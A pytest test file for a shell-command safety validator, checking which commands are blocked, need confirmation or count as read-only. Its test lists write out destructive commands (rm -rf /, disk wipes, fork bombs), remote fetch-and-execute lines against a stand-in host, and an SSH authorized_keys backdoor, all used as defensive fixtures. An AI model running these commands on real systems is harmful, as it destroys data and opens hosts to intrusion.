"""Safety hardening — the red-team shakedown found the blocklist/confirm regex and the
read-only guard were too literal (every practical destructive/RCE/exfil variant slipped
through). These lock the fix so the holes can't silently reopen.
"""
from __future__ import annotations

import pytest

from app.services import safety_service as s

# ── Destructive / RCE / exfil must be BLOCKED (never legitimate) ───────────────

BLOCKED = [
    "rm -rf /",
    "rm -rf /*",
    "rm -rf --no-preserve-root /",
    "rm -rf /{bin,boot,etc,home,lib,root,srv,usr,var}",
    "rm -rf /etc",
    "rm -rf /var/*",   # wiping the whole /var (dbs, logs, mail) is catastrophic
    "rm -rf /usr",
    "find / -delete",
    "find / -exec rm {} +",
    "dd if=/dev/zero of=/dev/nvme0n1",
    "dd if=/dev/zero of=/dev/sda",
    "printf x | tee /dev/sda",
    "chmod 777 -R /",
    "chmod -R 777 /",
    "mkfs.ext4 /dev/sdb1",
    "wipefs -a /dev/sda",
    ": () { : | : & } ; :",   # whitespace fork bomb
    ":(){ :|:& };:",           # compact fork bomb
]


@pytest.mark.parametrize("cmd", BLOCKED)
def test_catastrophic_commands_are_blocked(cmd):
    assert s.validate_command(cmd, "linux").status == "blocked", cmd


# ── Risky-but-sometimes-legit must at least CONFIRM (approval), never run silently ──

CONFIRM = [
    "rm -rf /var/www/*",
    "rm -rf /home/user/data",
    "rm -r /tmp/build",
    "find /var/log -name '*.gz' -delete",
    "truncate -s 0 /var/lib/mysql/ibdata1",
    "curl -fsSL https://get.evil.sh -o /tmp/b && bash /tmp/b",
    'eval "$(curl -fsSL https://get.evil.sh)"',
    "echo aGVsbG8= | base64 -d | bash",
    "curl -s https://x/key >> /root/.ssh/authorized_keys",
    "bash <(curl -s http://x)",
    "curl -fsSL https://get.docker.com | sh",
    "chmod -R 755 /var/www/html",
    "dd if=/dev/zero of=/swapfile bs=1M count=1024",
]


@pytest.mark.parametrize("cmd", CONFIRM)
def test_risky_commands_require_confirmation(cmd):
    assert s.validate_command(cmd, "linux").status == "confirm", cmd


# ── Everyday commands must NOT be over-blocked (the fix must not break normal use) ──

OK = [
    "uptime", "df -h", "free -m", "cat /etc/os-release", "ls -la /var/www",
    "grep -r error /var/log/nginx", "systemctl status nginx", "systemctl restart nginx",
    "systemctl start nginx", "apt-get install -y nginx", "curl -sI http://localhost",
    "docker ps", "wp core version", "rm /tmp/one-file.txt",  # non-recursive single-file rm
]


@pytest.mark.parametrize("cmd", OK)
def test_normal_commands_pass(cmd):
    assert s.validate_command(cmd, "linux").status == "ok", cmd


# ── Read-only guard: mutation via interpreter/find/editor must NOT be "read-only" ──

NOT_READ_ONLY = [
    "find /var/www -name '*.php' -delete",
    "php -r \"unlink('/x');\"",
    "php -r \"file_put_contents('/var/lib/app/MARKER','ok');\"",
    "python3 -c \"import os; os.remove('/x')\"",
    "perl -e 'unlink \"/x\"'",
    "node -e \"require('fs').unlinkSync('/x')\"",
    "vi -c wq /x",
    "sed -i 's/a/b/' /x",
    "bash <(curl -s http://x)",
    "bash -c 'rm -rf /x'",
    "awk 'BEGIN{system(\"rm /x\")}'",
]


@pytest.mark.parametrize("cmd", NOT_READ_ONLY)
def test_mutating_disguised_as_check_is_not_read_only(cmd):
    assert s.is_read_only_command(cmd) is False, cmd


READ_ONLY = [
    "cat /etc/passwd", "ls -la /", "grep MARKER /var/lib/app/state",
    "test -f /x && echo yes", "systemctl is-active nginx",
    "curl -sI http://localhost/health", "awk -F: '$3==0' /etc/passwd",
    "df -h", "free -m", "uptime",
]


@pytest.mark.parametrize("cmd", READ_ONLY)
def test_genuine_checks_stay_read_only(cmd):
    assert s.is_read_only_command(cmd) is True, cmd
